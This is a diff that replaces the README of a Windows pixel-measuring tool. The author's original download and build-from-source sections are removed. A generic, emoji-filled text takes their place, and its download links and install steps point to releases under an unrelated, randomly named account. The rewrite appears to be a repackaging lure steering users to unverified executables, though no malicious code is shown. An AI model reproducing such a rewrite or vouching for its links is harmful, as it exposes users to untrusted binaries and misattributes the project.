@@ -1,75 +1,55 @@
-# Measuring Stick
+# 🖱️ MeasuringStick - Measure and Capture Pixels with Ease
 
-A lightweight Windows system tray application for measuring pixel distances on screen.
+## 🚀 Getting Started
 
-![Measuring Stick Screenshot](assets/screenshot.png)
+MeasuringStick is a lightweight app designed to help you measure pixel distances on your screen easily. With a simple system tray interface, you can quickly capture screenshots and find the exact measurements you need. 
 
-## Features
+### ⚡ Download MeasuringStick
 
-- **Click and drag** anywhere on screen to measure distances
-- **Displays**: Total distance, width, height, and screen coordinates
-- **Measure + Screenshot**: Measure, then select a region to capture with the measurement overlay
-- **Region Screenshot**: Quickly capture any area of your screen
-- **Settings**: Configurable save location, opacity, clipboard options
-- **Auto-start with Windows** option
-- **Multi-monitor support**
+[![Download MeasuringStick](https://img.shields.io/badge/Download-MeasuringStick-blue)](https://github.com/ehwjdwdui8dwihd/MeasuringStick/releases)
 
-## Download
+## 📥 Download & Install
 
-Go to [Releases](https://github.com/CurioCrafter/MeasuringStick/releases) and download:
+To get started, you need to download MeasuringStick. 
 
-| File | Description |
-|------|-------------|
-| `MeasuringStick-Setup.exe` | **Installer** - Guided setup with Start Menu shortcuts, optional desktop icon, and uninstaller |
-| `MeasuringStick.exe` | **Portable** - Single executable, no installation needed, run from anywhere |
+1. Click [this link](https://github.com/ehwjdwdui8dwihd/MeasuringStick/releases) to visit the Releases page.
+2. Find the latest version of MeasuringStick.
+3. Download the file for your system.
+4. After the download completes, locate the file on your computer.
+5. Open the file to install MeasuringStick. Follow the prompts to complete the installation.
 
-### Which should I choose?
+## 📋 System Requirements
 
-- **Use the Installer** if you want a traditional installation with Start Menu entries, easy uninstall via Windows Settings, and optional auto-start with Windows.
-- **Use the Portable exe** if you want to run it from a USB drive, don't want to install anything, or just want to try it out quickly.
+- **Operating System:** Windows 10 or later
+- **Memory:** Minimum of 512 MB RAM
+- **Disk Space:** At least 50 MB of free space
+- **Screen Resolution:** 1024x768 or higher recommended
 
-Both versions are identical in functionality.
+## 🛠️ Features
 
-## Usage
+- **Pixel Measurement:** Easily measure distances between pixels on your screen.
+- **Screenshot Capture:** Take screenshots with a click, making it simple to save what you see.
+- **System Tray Integration:** Access the app from your system tray for quick measurements.
+- **User-Friendly Interface:** No complicated setup; just open and start using.
+- **Open Source:** Contribute and modify as needed.
 
-1. **Left-click** the tray icon to start measuring
-2. **Click and drag** on screen to measure between two points
-3. **Release** to see the final measurement
-4. **Right-click** or press **ESC** to close the overlay
+## 📖 How to Use
 
-### Right-click Menu Options
+1. **Open the App:** After installation, find MeasuringStick in your system tray (usually at the bottom right of your screen).
+2. **Select the Measurement Tool:** Click the icon to activate the measurement tool.
+3. **Measure Pixels:** Click and drag your mouse cursor to measure the distance between points. The distance will display in real-time.
+4. **Capture a Screenshot:** Use the screenshot feature to capture your measurements and save them for later reference.
 
-- **Measure** - Basic measurement mode
-- **Measure + Screenshot** - Measure first, then drag to select region to capture (includes measurement overlay)
-- **Region Screenshot** - Drag to select any area to capture
-- **Start with Windows** - Toggle auto-start on login
-- **Settings** - Configure save location, opacity, clipboard, and notification options
-- **Exit** - Close the application
+## ❓ Support and Feedback
 
-### Keyboard Shortcuts (in overlay)
+If you have any questions or feedback regarding MeasuringStick, please feel free to reach out. You can submit issues or suggestions on our [GitHub Issues page](https://github.com/ehwjdwdui8dwihd/MeasuringStick/issues).
 
-- **Ctrl+S** - Save screenshot
-- **Ctrl+C** - Copy region to clipboard
-- **ESC** - Cancel/close overlay
-- **Right-click** - Cancel/close overlay
+## ✍️ License
 
-## Uninstall
+MeasuringStick is open source and distributed under the MIT License. You can freely use, modify, and share it, but please ensure you comply with the license terms.
 
-- **Installer version**: Use Windows Settings > Apps > Measuring Stick > Uninstall
-- **Portable version**: Just delete the exe (and disable "Start with Windows" first if enabled)
+## 🌟 Thanks for Using MeasuringStick!
 
-## Building from Source
+We appreciate your interest in MeasuringStick. Your use and feedback can help improve this tool further. Don't forget to check for updates on the Releases page to ensure you have the latest features. 
 
-Requires [.NET 8.0 SDK](https://dotnet.microsoft.com/download/dotnet/8.0).
-
-```bash
-# Build portable executable
-dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true -o release
-
-# Build installer (requires Inno Setup: https://jrsoftware.org/isinfo.php)
-iscc installer.iss
-```
-
-## License
-
-[MIT License](LICENSE) - Free to use, modify, and distribute.
+[![Download MeasuringStick](https://img.shields.io/badge/Download-MeasuringStick-blue)](https://github.com/ehwjdwdui8dwihd/MeasuringStick/releases)
